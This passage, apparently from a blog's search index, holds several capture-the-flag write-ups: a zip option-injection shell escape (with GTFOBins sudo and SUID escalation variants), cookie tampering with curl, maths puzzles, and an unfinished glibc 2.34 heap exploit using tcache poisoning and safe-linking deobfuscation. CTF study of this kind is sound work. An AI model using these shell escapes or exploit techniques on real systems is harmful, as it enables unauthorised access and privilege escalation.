^ ___ ^ ^ ^ ^ / \\^ ^ | |^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ / \\ ^ _ ^ / | | \\^ ^| | ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | // | /_\\ ^| | ____ ____ | | ^ | |^ =|= ^ =================^ ^=|=^| |^=|=^ | | {____}{____} | |^ ^| | ^ ^ ^ ^ | ========= |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ | |^ ^ ^ ^ ^| / ( \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/ %%%%%%%%%%%%%% \\|^ ^| .-----. ^ || ) ||^ ^.-------.-------.^| %%%%%%%%%%%%%%%% | ^ | | |^ ^|| o ) ( o || ^ | | | | /||||||||||||||||\\ |^ ^| | ___ | ^ || | ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ | |'.____'_^||/!\\@@@@@/!\\|| _'______________.'|== ===== |\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" My room is so cluttered... What do you see? code == 0xdeadbeef: how did that happen?? take a flag for your troubles picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/clutter-overflow/","section":"ctf","summary":"picoMini by redpwn. 150 points. 64-bit binary. Buffer Overflow. Local variable modification","time":5,"title":"clutter-overflow"},{"contents":"For this challenge we are only given a remote instance to connect to:\n$ nc 157.245.33.77 31001 [*] Directory to work in: 9wIylX4fBakMNG8u6YfY37k3k1geVXHv Component List: +===============+ | | | 1. Head 🤖 | | 2. Torso 🦴 | | 3. Hands 💪 | | 4. Legs 🦵 | | | +===============+ [*] Choose component:  We can choose the first one, for example:\n[*] Choose component: 1 [*] Sub-directory to work in: 9wIylX4fBakMNG8u6YfY37k3k1geVXHv/Head Actions: 1. Create artifact 2. List directory (pwd; ls -la) 3. Read artifact (cat ./\u0026lt;name\u0026gt;) 4. Compress artifact (zip \u0026lt;name\u0026gt;.zip \u0026lt;name\u0026gt; \u0026lt;options\u0026gt;) 5. Change directory (cd \u0026lt;dirname\u0026gt;) 6. Clean directory (rm -rf ./*) 7. Exit [*] Choose action:  Alright, we have some options to work with.\nWe see that we can use zip as a command and provide options. If we check GFTObins, we discover that we can actually get a shell with a specific parameter.\nYou can also check out my tool gtfobins-cli to view this information from the command line interface:\n$ gtfobins-cli zip zip ==\u0026gt; https://gtfobins.github.io/gtfobins/zip/ Shell It can be used to break out from restricted environments by spawning an interactive system shell. TF=$(mktemp -u) zip $TF /etc/hosts -T -TT 'sh #' rm $TF File read It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system. LFILE=file-to-read TF=$(mktemp -u) zip $TF $LFILE unzip -p $TF Sudo If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. TF=$(mktemp -u) sudo zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF Limited SUID If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (sh shell to run with SUID privileges. sudo install -m =xs $(which zip) . TF=$(mktemp -u) ./zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF  Perfect, so we can use -T -TT 'sh #' as command options to get a shell. But first, we must create an artifact, because we do not have anything at the current working directory:\n[*] Choose action: 2 /home/ctf/Rm4gXvPOefWkBXd3VYlOQyrGvLEnwNMm/Head total 8 drwxr-sr-x 2 ctf ctf 4096 May 19 00:45 . drwxr-sr-x 6 ctf ctf 4096 May 19 00:45 .. Actions: 1. Create artifact 2. List directory (pwd; ls -la) 3. Read artifact (cat ./\u0026lt;name\u0026gt;) 4. Compress artifact (zip \u0026lt;name\u0026gt;.zip \u0026lt;name\u0026gt; \u0026lt;options\u0026gt;) 5. Change directory (cd \u0026lt;dirname\u0026gt;) 6. Clean directory (rm -rf ./*) 7. Exit [*] Choose action: 1 Insert name: asdf Insert content: asdf [+] Artifact [asdf] was created successfuly! Actions: 1. Create artifact 2. List directory (pwd; ls -la) 3. Read artifact (cat ./\u0026lt;name\u0026gt;) 4. Compress artifact (zip \u0026lt;name\u0026gt;.zip \u0026lt;name\u0026gt; \u0026lt;options\u0026gt;) 5. Change directory (cd \u0026lt;dirname\u0026gt;) 6. Clean directory (rm -rf ./*) 7. Exit [*] Choose action:  Now we can use the GTFOBin to get a shell and find the flag:\n[*] Choose action: 4 Insert \u0026lt;name\u0026gt;.zip: asdf Insert \u0026lt;name\u0026gt;: asdf Insert \u0026lt;options\u0026gt;: -T -TT 'sh #' adding: asdf (stored 0%) whoami ctf cd .. ls Hands Head Legs Torso cd .. ls Rm4gXvPOefWkBXd3VYlOQyrGvLEnwNMm artifacts.py clear.py flag.txt cat flag.txt HTB{z1pp1ti_z0pp1t1_GTFO_0f_my_pr0p3rty}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/misc/compressor/","section":"ctf","summary":"GTFOBin in ZIP command","time":3,"title":"Compressor"},{"contents":"We are given a website that asks for a cookie:\nLooking at the developer tools, we can see that we have a cookie name=-1. If we send snickerdoodle as the placeholder suggests, the cookie will change to name=0:\nLet\u0026rsquo;s modify the value of the cookie using curl and show only the message:\n$ curl mercury.picoctf.net:27177/check -sH 'Cookie: name=0' | grep -oE '\u0026lt;b\u0026gt;.*?\u0026lt;/b\u0026gt;' \u0026lt;b\u0026gt;I love snickerdoodle cookies!\u0026lt;/b\u0026gt;  Now let\u0026rsquo;s use a loop in Bash to see if something change if we use another value as cookie:\n$ for i in {0..20}; do echo -n \"$i: \"; curl mercury.picoctf.net:27177/check -sH \"Cookie: name=$i\" | grep -oE '\u0026lt;b\u0026gt;.*?\u0026lt;/b\u0026gt;'; done 0: \u0026lt;b\u0026gt;I love snickerdoodle cookies!\u0026lt;/b\u0026gt; 1: \u0026lt;b\u0026gt;I love chocolate chip cookies!\u0026lt;/b\u0026gt; 2: \u0026lt;b\u0026gt;I love oatmeal raisin cookies!\u0026lt;/b\u0026gt; 3: \u0026lt;b\u0026gt;I love gingersnap cookies!\u0026lt;/b\u0026gt; 4: \u0026lt;b\u0026gt;I love shortbread cookies!\u0026lt;/b\u0026gt; 5: \u0026lt;b\u0026gt;I love peanut butter cookies!\u0026lt;/b\u0026gt; 6: \u0026lt;b\u0026gt;I love whoopie pie cookies!\u0026lt;/b\u0026gt; 7: \u0026lt;b\u0026gt;I love sugar cookies!\u0026lt;/b\u0026gt; 8: \u0026lt;b\u0026gt;I love molasses cookies!\u0026lt;/b\u0026gt; 9: \u0026lt;b\u0026gt;I love kiss cookies!\u0026lt;/b\u0026gt; 10: \u0026lt;b\u0026gt;I love biscotti cookies!\u0026lt;/b\u0026gt; 11: \u0026lt;b\u0026gt;I love butter cookies!\u0026lt;/b\u0026gt; 12: \u0026lt;b\u0026gt;I love spritz cookies!\u0026lt;/b\u0026gt; 13: \u0026lt;b\u0026gt;I love snowball cookies!\u0026lt;/b\u0026gt; 14: \u0026lt;b\u0026gt;I love drop cookies!\u0026lt;/b\u0026gt; 15: \u0026lt;b\u0026gt;I love thumbprint cookies!\u0026lt;/b\u0026gt; 16: \u0026lt;b\u0026gt;I love pinwheel cookies!\u0026lt;/b\u0026gt; 17: \u0026lt;b\u0026gt;I love wafer cookies!\u0026lt;/b\u0026gt; 18: \u0026lt;b\u0026gt;Flag\u0026lt;/b\u0026gt; 19: \u0026lt;b\u0026gt;I love macaroon cookies!\u0026lt;/b\u0026gt; 20: \u0026lt;b\u0026gt;I love fortune cookies!\u0026lt;/b\u0026gt;  Nice, we see that name=18 will show the flag:\n$ curl mercury.picoctf.net:27177/check -sH 'Cookie: name=18' | grep -oE 'picoCTF{.*?}' picoCTF{3v3ry1_l0v3s_c00k135_064663be}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/web-exploitation/cookies/","section":"ctf","summary":"picoCTF 2021. 40 points. Modify cookies","time":2,"title":"Cookies"},{"contents":"We are asked to compute the cosine of 42 radians, rounded to 6 decimal places. This is simple:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; import math \u0026gt;\u0026gt;\u0026gt; math.cos(42) -0.39998531498835127 \u0026gt;\u0026gt;\u0026gt; round(math.cos(42), 6) -0.399985 \u0026gt;\u0026gt;\u0026gt; 'ictf{' + str(round(math.cos(42), 6)) + '}' 'ictf{-0.399985}'  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/cos1/","section":"ctf","summary":"ImaginaryCTF 02/08/2022. 30 points. Cosine of a number","time":1,"title":"cos1"},{"contents":"We are asked to compute the cosine of 42 radians, rounded to 100 decimal places. For this, we can use Wolfram Alpha:\nAnd the flag is:\nictf{-0.3999853149883512939547073371772020283804228791424190606167446601513424425835587794388549191368621883}\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/cos2/","section":"ctf","summary":"ImaginaryCTF 04/08/2022. 30 points. Cosine of a number with many decimal places","time":1,"title":"cos2"},{"contents":"We have a 64-bit binary called crsid:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/'  If we execute it, we need to enter a CRSid and then we have this menu:\n$ ./crsid ██████╗██████╗ ███████╗██╗██████╗ ██╔════╝██╔══██╗██╔════╝██║██╔══██╗ ██║ ██████╔╝███████╗██║██║ ██║ ██║ ██╔══██╗╚════██║██║██║ ██║ ╚██████╗██║ ██║███████║██║██████╔╝ ╚═════╝╚═╝ ╚═╝╚══════╝╚═╝╚═════╝ [i] Enter your CRSid: asdf ========================= [1] Create username [2] Delete username [3] Edit username [4] Show username [5] Change your CRSid [6] Exit ========================= [#]  Reverse engineering It is a typical heap challenge. The reverse engineering process is quite simple, despite the fact that the binary is stripped. This is the main function:\nintmain(){ interr; intret; longin_FS_OFFSET; intoption; intchanged_username; longcanary; canary=*(long*)(in_FS_OFFSET+0x28); setup(); banner(); printf(\"[i]EnteryourCRSid:\"); read(0,crsid,32); option=0; changed_username=0; do{ menu(); err=__isoc99_scanf(\"%d\",\u0026amp;option); if(err\u0026lt;0){ puts(\"Somethingwentwrong!\"); ret=1; gotoLAB_001019a6; } switch(option){ default: puts(\"Unrecognizedcommand!\"); ret=1; gotoLAB_001019a6; case1: err=create_username(); if(err!=0){ ret=1; gotoLAB_001019a6; } break; case2: err=delete_username(); if(err!=0){ ret=1; gotoLAB_001019a6; } break; case3: err=edit_username(); if(err!=0){ ret=1; gotoLAB_001019a6; } break; case4: err=show_username(); if(err!=0){ ret=1; LAB_001019a6: if(canary!=*(long*)(in_FS_OFFSET+0x28)){ /*WARNING:Subroutinedoesnotreturn*/ __stack_chk_fail(); } returnret; } break; case5: if(changed_username==0){ puts(\"Changedyourmind?\"); printf(\"EnternewCRSid:\"); read(0,crsid,32); puts(\"Changedsuccessfully!\"); changed_username=1; }else{ puts(\"No,youchangeyourmindtoooften.\"); } break; case6: ret=0; gotoLAB_001019a6; } }while(true); }  Allocation function The first option is for creating users, so it will be called create_username:\nintcreate_username(){ intnum_users; intret; char*p_user;  num_users=check_users(); if(num_users\u0026lt;0){ puts(\"Nomoreusernamesforyou!\"); ret=0; }else{ p_user=(char*)malloc(0x40); if(p_user==(char*)0x0){ puts(\"Somethingweirdhappened.\"); ret=1; }else{ users[num_users]=p_user; *p_user='\\0'; puts(\"Anewusernameappeared!\"); ret=0; } } returnret; }  This function only allows us to allocate chunks of user size 0x40 (which will be size 0x50 on the heap metadata). The number of allocations is limited to 12, and it is checked by a function renamed to check_users:\nintcheck_users(){ intnum_users;  num_users=0; while(true){ if(12\u0026lt;num_users){ return-1; } if(users[num_users]==(char*)0x0)break; num_users=num_users+1; } returnnum_users; }  There is a global variable named as users that holds an array for the 12 available pointers for users.\nFree function This is the function to delete users (delete_username):\nintdelete_username(){ interr; intret; longin_FS_OFFSET; intindex; longcanary; canary=*(long*)(in_FS_OFFSET+0x28); printf(\"Usernameindex:\"); err=__isoc99_scanf(\"%d\",\u0026amp;index); if(err\u0026lt;1){ puts(\"Thatwon\\'twork.\"); ret=1; }elseif((index\u0026lt;0)||(12\u0026lt;index)){ puts(\"Whereareyougoing?\"); ret=1; }elseif(users[index]==(char*)0x0){ puts(\"Nosuchusername.\"); ret=1; }else{ free(users[index]); users[index]=(char*)0x0; puts(\"Usernameremovedsuccessfully!\"); ret=0; } if(canary!=*(long*)(in_FS_OFFSET+0x28)){ /*WARNING:Subroutinedoesnotreturn*/ __stack_chk_fail(); } returnret; }  Here we have a vulnerability because the variable called index can have 12 as value, and indeces for users go from 0 to 11. Hence, we can access the array out-of-bounds (OOB). Moreover, after the global variable users, we have crsid, which is under our control (we can change it once using option 5, which appears in the main function). We will see this later in GDB.\nEdit function This is edit_username (option 3):\nintedit_username(){ interr; intret; size_tnewline_index; longin_FS_OFFSET; intindex; longcanary;  canary=*(long*)(in_FS_OFFSET+0x28); printf(\"Usernameindex:\"); err=__isoc99_scanf(\"%d\",\u0026amp;index); if(err\u0026lt;1){ puts(\"Thatwon\\'twork.\"); ret=1; }elseif((index\u0026lt;0)||(12\u0026lt;index)){ puts(\"Whereareyougoing?\"); ret=1; }elseif(users[index]==(char*)0x0){ puts(\"Nosuchusername.\"); ret=1; }else{ printf(\"Username:\"); read(0, users[index],0x40); newline_index=strcspn(users[index],\"\\n\"); users[index][newline_index]='\\0'; puts(\"Usernamechangedsuccessfully!\"); ret=0; } if(canary!=*(long*)(in_FS_OFFSET+0x28)){ /*WARNING:Subroutinedoesnotreturn*/ __stack_chk_fail(); } returnret; }  This function is correct, except for the OOB array access. We can write at most 0x40 bytes in the chunk, so we can\u0026rsquo;t overflow to the adjacent chunk.\nShow function Finally, this is show_username (option 4):\nintshow_username(){ interr; intret; longin_FS_OFFSET; intindex; longcanary;  canary=*(long*)(in_FS_OFFSET+0x28); printf(\"Usernameindex:\"); err=__isoc99_scanf(\"%d\",\u0026amp;index); if(err\u0026lt;1){ puts(\"Thatwon\\'twork.\"); ret=1; }elseif((index\u0026lt;0)||(12\u0026lt;index)){ puts(\"Whereareyougoing?\"); ret=1; }elseif(users[index]==(char*)0x0){ puts(\"Nosuchusername.\"); ret=1; }else{ printf(\"Username:\"); puts(users[index]); ret=0; } if(canary!=*(long*)(in_FS_OFFSET+0x28)){ /*WARNING:Subroutinedoesnotreturn*/ __stack_chk_fail(); } returnret; }  Exploit strategy In order to plan the exploit strategy, we must take into account that the binary uses Glibc 2.34 (it is provided in the challenge):\n$ glibc/ld-2.34.so glibc/libc.so.6 GNU C Library (GNU libc) stable release version 2.34. Copyright (C) 2021 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Compiled by GNU CC version 11.1.0. libc ABIs: UNIQUE IFUNC ABSOLUTE For bug reporting instructions, please see: \u0026lt;https://www.gnu.org/software/libc/bugs.html\u0026gt;.  Safe-linking This is a pretty hardened version of Glibc. If we check how2heap, we will notice that it uses safe-linking to obfuscate forward pointers (fd) on freed chunks. We can check this in GDB:\n$ gdb -q crsid Reading symbols from crsid... (No debugging symbols found in crsid) pwndbg\u0026gt; run Starting program: ./crsid ██████╗██████╗ ███████╗██╗██████╗ ██╔════╝██╔══██╗██╔════╝██║██╔══██╗ ██║ ██████╔╝███████╗██║██║ ██║ ██║ ██╔══██╗╚════██║██║██║ ██║ ╚██████╗██║ ██║███████║██║██████╔╝ ╚═════╝╚═╝ ╚═╝╚══════╝╚═╝╚═════╝ [i] Enter your CRSid: asdf ========================= [1] Create username [2] Delete username [3] Edit username [4] Show username [5] Change your CRSid [6] Exit ========================= [#] 1 A new username appeared! ========================= [1] Create username [2] Delete username [3] Edit username [4] Show username [5] Change your CRSid [6] Exit ========================= [#] 1 A new username appeared! ========================= [1] Create username [2] Delete username [3] Edit username [4] Show username [5] Change your CRSid [6] Exit ========================= [#] 2 Username index: 1 Username removed successfully! ========================= [1] Create username [2] Delete username [3] Edit username [4] Show username [5] Change your CRSid [6] Exit ========================= [#] 2 Username index: 0 Username removed successfully! ========================= [1] Create username [2] Delete username [3] Edit username [4] Show username [5] Change your CRSid [6] Exit ========================= [#] ^C Program received signal SIGINT, Interrupt. 0x00007ffff7ec15ce in __GI___libc_read (fd=0, buf=0x7ffff7fb4b03 \u0026lt;_IO_2_1_stdin_+131\u0026gt;, nbytes=1) at ../sysdeps/unix/sysv/linux/read.c:26 26 ../sysdeps/unix/sysv/linux/read.c: No such file or directory.  pwndbg\u0026gt; vis_heap_chunks 0x555555559000 0x0000000000000000 0x0000000000000291 ................ 0x555555559010 0x0002000000000000 0x0000000000000000 ................ 0x555555559020 0x0000000000000000 0x0000000000000000 ................ 0x555555559030 0x0000000000000000 0x0000000000000000 ................ 0x555555559040 0x0000000000000000 0x0000000000000000 ................ 0x555555559050 0x0000000000000000 0x0000000000000000 ................ 0x555555559060 0x0000000000000000 0x0000000000000000 ................ 0x555555559070 0x0000000000000000 0x0000000000000000 ................ 0x555555559080 0x0000000000000000 0x0000000000000000 ................ 0x555555559090 0x0000000000000000 0x0000000000000000 ................ 0x5555555590a0 0x0000000000000000 0x00005555555592a0 ..........UUUU.. 0x5555555590b0 0x0000000000000000 0x0000000000000000 ................ 0x5555555590c0 0x0000000000000000 0x0000000000000000 ................ 0x5555555590d0 0x0000000000000000 0x0000000000000000 ................ 0x5555555590e0 0x0000000000000000 0x0000000000000000 ................ 0x5555555590f0 0x0000000000000000 0x0000000000000000 ................ 0x555555559100 0x0000000000000000 0x0000000000000000 ................ 0x555555559110 0x0000000000000000 0x0000000000000000 ................ 0x555555559120 0x0000000000000000 0x0000000000000000 ................ 0x555555559130 0x0000000000000000 0x0000000000000000 ................ 0x555555559140 0x0000000000000000 0x0000000000000000 ................ 0x555555559150 0x0000000000000000 0x0000000000000000 ................ 0x555555559160 0x0000000000000000 0x0000000000000000 ................ 0x555555559170 0x0000000000000000 0x0000000000000000 ................ 0x555555559180 0x0000000000000000 0x0000000000000000 ................ 0x555555559190 0x0000000000000000 0x0000000000000000 ................ 0x5555555591a0 0x0000000000000000 0x0000000000000000 ................ 0x5555555591b0 0x0000000000000000 0x0000000000000000 ................ 0x5555555591c0 0x0000000000000000 0x0000000000000000 ................ 0x5555555591d0 0x0000000000000000 0x0000000000000000 ................ 0x5555555591e0 0x0000000000000000 0x0000000000000000 ................ 0x5555555591f0 0x0000000000000000 0x0000000000000000 ................ 0x555555559200 0x0000000000000000 0x0000000000000000 ................ 0x555555559210 0x0000000000000000 0x0000000000000000 ................ 0x555555559220 0x0000000000000000 0x0000000000000000 ................ 0x555555559230 0x0000000000000000 0x0000000000000000 ................ 0x555555559240 0x0000000000000000 0x0000000000000000 ................ 0x555555559250 0x0000000000000000 0x0000000000000000 ................ 0x555555559260 0x0000000000000000 0x0000000000000000 ................ 0x555555559270 0x0000000000000000 0x0000000000000000 ................ 0x555555559280 0x0000000000000000 0x0000000000000000 ................ 0x555555559290 0x0000000000000000 0x0000000000000051 ........Q....... 0x5555555592a0 0x000055500000c7a9 0x0f26857560c7a3e2 ....PU.....`u.\u0026. \u0026lt;-- tcachebins[0x50][0/2] 0x5555555592b0 0x0000000000000000 0x0000000000000000 ................ 0x5555555592c0 0x0000000000000000 0x0000000000000000 ................ 0x5555555592d0 0x0000000000000000 0x0000000000000000 ................ 0x5555555592e0 0x0000000000000000 0x0000000000000051 ........Q....... 0x5555555592f0 0x0000000555555559 0x0f26857560c7a3e2 YUUU.......`u.\u0026. \u0026lt;-- tcachebins[0x50][1/2] 0x555555559300 0x0000000000000000 0x0000000000000000 ................ 0x555555559310 0x0000000000000000 0x0000000000000000 ................ 0x555555559320 0x0000000000000000 0x0000000000000000 ................ 0x555555559330 0x0000000000000000 0x0000000000020cd1 ................ \u0026lt;-- Top chunk pwndbg\u0026gt; bins tcachebins 0x50 [ 2]: 0x5555555592a0 —▸ 0x5555555592f0 ◂— 0x0 fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all: 0x0 smallbins empty largebins empty  The way safe-linking works is by encrypting the original fd pointer using XOR and the heap address shifted 12 bits to the right as key:\nfd = 0x00005555555592f0 key = 0x0000000555555559 ------------------------ res = 0x000055500000c7a9  However, this mitigation is useless because of how ASLR works. The key of encryption are the bits that do not change from heap addresses. The base address of the heap ends in 000 in hexadecimal (12 bits).\nSo, suppose we can leak the obfuscated fd pointer: 0x000055500000c7a9. We know that 555 are part of the real fd:\nleak = 0x000055500000c7a9 key = 0x0000000********* ------------------------- fd = 0x0000555*********  Then we can continue with the next three hexadecimal digits: 0x555 ^ 0x000 = 0x555.\nleak = 0x000055500000c7a9 key = 0x0000000555****** ------------------------- fd = 0x0000555555******  And then with the next ones: 00c ^ 0x555 = 0x559.\nleak = 0x000055500000c7a9 key = 0x0000000555555*** ------------------------- fd = 0x0000555555559***  And finally: 0x7a9 ^ 0x559 = 0x2f0.\nleak = 0x000055500000c7a9 key = 0x0000000555555559 ------------------------- fd = 0x00005555555592f0  Therefore, we can obtain the original fd from the obfuscated one.\nThese are two functions to obfuscate and deobfuscate pointers (taken from [CSR20] HowToHeap - Libc 2.32):\ndefdeobfuscate(x: int, l: int=64) -\u0026gt; int: p=0 foriinrange(l*4, 0, -4): v1=(x\u0026amp;(0xf\u0026lt;\u0026lt;i)) \u0026gt;\u0026gt;i v2=(p\u0026amp;(0xf\u0026lt;\u0026lt;i+12)) \u0026gt;\u0026gt;i+12 p|=(v1^v2) \u0026lt;\u0026lt;i returnp defobfuscate(ptr: int, addr: int) -\u0026gt; int: returnptr^(addr\u0026gt;\u0026gt;12)  Tcache poisoning Since Glibc 2.34 uses Tcache, the idea is to perform a Tcache poisoning attack. For this, we will need to modify the fd pointer of a freed chunk (Write After Free), so that we corrupt the Tcache linked list and allocate a chunk in a controlled address.\nEventually, we will need to leak an address inside Glibc. The way to do this is a bit tricky. The idea is to force scanf to allocate a big chunk and force heap consolidation (malloc_consolidate, more information here). If we fill the Tcache for size 0x50 (7 chunks), the next freed chunk will go to the Fast Bin. Once scanf handles a large string (at least 1024 characters), the Fast Bin chunk is sent to the Small Bin (leaving fd and bk pointers from main_arena) due to consolidation.\nWe can test it like this:\ndefmain(): p=get_process() gdb.attach(p, gdbscript='continue') p.sendlineafter(b'[i] Enter your CRSid: ', b'asdf') for_inrange(8): create(p) foriinrange(7, -1, -1): delete(p, i) input('Before large string...') p.sendline(b'0'*1023+b'1') input('After large string...')  $ python3 solve.py [*] './crsid' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' [+] Starting local process './crsid': pid 953757 [*] running in new terminal: ['/usr/bin/gdb', '-q', './crsid', '953757', '-x', '/tmp/pwng458iat1.gdb'] [+] Waiting for debugger: Done Before large string...  Reading symbols from ./crsid... (No debugging symbols found in ./crsid) Attaching to program: ./crsid, process 953757 Reading symbols from ./glibc/libc.so.6... Reading symbols from ./glibc/ld-2.34.so... 0x00007f3a112925ce in __GI___libc_read (fd=0, buf=0x557a3afba0c0, nbytes=32) at ../sysdeps/unix/sysv/linux/read.c:26 26 ../sysdeps/unix/sysv/linux/read.c: No such file or directory. ^C Program received signal SIGINT, Interrupt. 0x00007f3a112925ce in __GI___libc_read (fd=0, buf=0x7fb2c71d2b03 \u0026lt;_IO_2_1_stdin_+131\u0026gt;, nbytes=1) at ../sysdeps/unix/sysv/linux/read.c:26 26 in ../sysdeps/unix/sysv/linux/read.c  pwndbg\u0026gt; bins tcachebins 0x50 [ 7]: 0x5594e7ebc2f0 —▸ 0x5594e7ebc340 —▸ 0x5594e7ebc390 —▸ 0x5594e7ebc3e0 —▸ 0x5594e7ebc430 —▸ 0x5594e7ebc480 —▸ 0x5594e7ebc4d0 ◂— 0x0 fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x5594e7ebc290 ◂— 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all: 0x0 smallbins empty largebins empty pwndbg\u0026gt; continue Continuing.  As we can see, we have the Fast Bin chunk at 0x5594e7ebc290. If we hit ENTER to send the large string, we will see the chunk in the Small Bin:\n$ python3 solve.py [*] './crsid' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' [+] Starting local process './crsid': pid 953757 [*] running in new terminal: ['/usr/bin/gdb', '-q', './crsid', '953757', '-x', '/tmp/pwng458iat1.gdb'] [+] Waiting for debugger: Done Before large string... After large string...  ^C Program received signal SIGINT, Interrupt. 0x00007f3a112925ce in __GI___libc_read (fd=0, buf=0x7fb2c71d2b03 \u0026lt;_IO_2_1_stdin_+131\u0026gt;, nbytes=1) at ../sysdeps/unix/sysv/linux/read.c:26 26 in ../sysdeps/unix/sysv/linux/read.c  pwndbg\u0026gt; bins tcachebins 0x50 [ 6]: 0x5594e7ebc340 —▸ 0x5594e7ebc390 —▸ 0x5594e7ebc3e0 —▸ 0x5594e7ebc430 —▸ 0x5594e7ebc480 —▸ 0x5594e7ebc4d0 ◂— 0x0 fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all: 0x0 smallbins 0x50: 0x5594e7ebc290 —▸ 0x7fb2c71d2d00 (main_arena+160) ◂— 0x5594e7ebc290 largebins empty  There it is, at the same address 0x5594e7ebc290.\nGlobal variables We can see the global variables on the following address space:\npwndbg\u0026gt; vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x5594e6cb0000 0x5594e6cb1000 r--p 1000 0 ./crsid 0x5594e6cb1000 0x5594e6cb2000 r-xp 1000 1000 ./crsid 0x5594e6cb2000 0x5594e6cb3000 r--p 1000 2000 ./crsid 0x5594e6cb3000 0x5594e6cb4000 r--p 1000 2000 ./crsid 0x5594e6cb4000 0x5594e6cb5000 rw-p 1000 3000 ./crsid 0x5594e7ebc000 0x5594e7edd000 rw-p 21000 0 [heap] 0x7fb2c6fe3000 0x7fb2c6fe6000 rw-p 3000 0 [anon_7fb2c6fe3] 0x7fb2c6fe6000 0x7fb2c7012000 r--p 2c000 0 ./glibc/libc.so.6 0x7fb2c7012000 0x7fb2c7179000 r-xp 167000 2c000 ./glibc/libc.so.6 0x7fb2c7179000 0x7fb2c71ce000 r--p 55000 193000 ./glibc/libc.so.6 0x7fb2c71ce000 0x7fb2c71cf000 ---p 1000 1e8000 ./glibc/libc.so.6 0x7fb2c71cf000 0x7fb2c71d2000 r--p 3000 1e8000 ./glibc/libc.so.6 0x7fb2c71d2000 0x7fb2c71d5000 rw-p 3000 1eb000 ./glibc/libc.so.6 0x7fb2c71d5000 0x7fb2c71e4000 rw-p f000 0 [anon_7fb2c71d5] 0x7fb2c71e4000 0x7fb2c71e5000 r--p 1000 0 ./glibc/ld-2.34.so 0x7fb2c71e5000 0x7fb2c7209000 r-xp 24000 1000 ./glibc/ld-2.34.so 0x7fb2c7209000 0x7fb2c7213000 r--p a000 25000 ./glibc/ld-2.34.so 0x7fb2c7213000 0x7fb2c7215000 r--p 2000 2e000 ./glibc/ld-2.34.so 0x7fb2c7215000 0x7fb2c7217000 rw-p 2000 30000 ./glibc/ld-2.34.so 0x7ffdf29cb000 0x7ffdf29ec000 rw-p 21000 0 [stack] 0x7ffdf29f3000 0x7ffdf29f7000 r--p 4000 0 [vvar] 0x7ffdf29f7000 0x7ffdf29f9000 r-xp 2000 0 [vdso] 0xffffffffff600000 0xffffffffff601000 --xp 1000 0 [vsyscall] pwndbg\u0026gt; x/30gx 0x5594e6cb4000 0x5594e6cb4000: 0x0000000000000000 0x00005594e6cb4008 0x5594e6cb4010: 0x0000000000000000 0x0000000000000000 0x5594e6cb4020 \u0026lt;stdout\u0026gt;: 0x00007fb2c71d3760 0x0000000000000000 0x5594e6cb4030 \u0026lt;stdin\u0026gt;: 0x00007fb2c71d2a80 0x0000000000000000 0x5594e6cb4040 \u0026lt;stderr\u0026gt;: 0x00007fb2c71d3680 0x0000000000000000 0x5594e6cb4050: 0x0000000000000000 0x0000000000000000 0x5594e6cb4060: 0x00005594e7ebc2f0 0x0000000000000000 0x5594e6cb4070: 0x0000000000000000 0x0000000000000000 0x5594e6cb4080: 0x0000000000000000 0x0000000000000000 0x5594e6cb4090: 